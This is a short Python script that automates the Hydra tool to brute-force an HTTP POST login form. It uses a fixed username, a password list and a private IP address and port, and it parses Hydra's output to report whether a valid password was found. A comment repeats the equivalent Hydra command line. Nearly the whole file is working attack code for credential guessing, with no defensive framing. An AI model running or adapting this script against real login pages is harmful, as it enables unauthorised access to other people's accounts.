import subprocess

import re

# hydra -l arnav -P passwords.txt 10.202.208.81 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:S=Hello World!"

def has_success_info(line):
    result = re.match('(\d+) of (\d+).*(?P<num_passwords>\d+) valid password(s?) found', line)
    print line, result
    return result is not None and int(result.group('num_passwords')) > 0

def successful(output_lines):
    for line in output_lines:
        if has_success_info(line):
            return True
    return False

def attack(username, passwords, ip_address, service_mode, address_and_details, port=80):
    proc = subprocess.Popen(['hydra', '-l', username, '-P', passwords, ip_address, '-s', port, service_mode, address_and_details], stdout = subprocess.PIPE)

    output = []
    while True:
        line = proc.stdout.readline()
        if line != '':
            output.append(line.rstrip())
        else:
            break
    if successful(output):
        print('success')
    else:
        print('failure')

username = 'arnav'
passwords = '../passwords.txt'
ip_address = '10.202.208.81'
port = '8081'
service_mode = 'http-post-form'
address_and_details = '/login:username=^USER^&password=^PASS^:S=Hello World!'

attack(username, passwords, ip_address, service_mode, address_and_details, port)
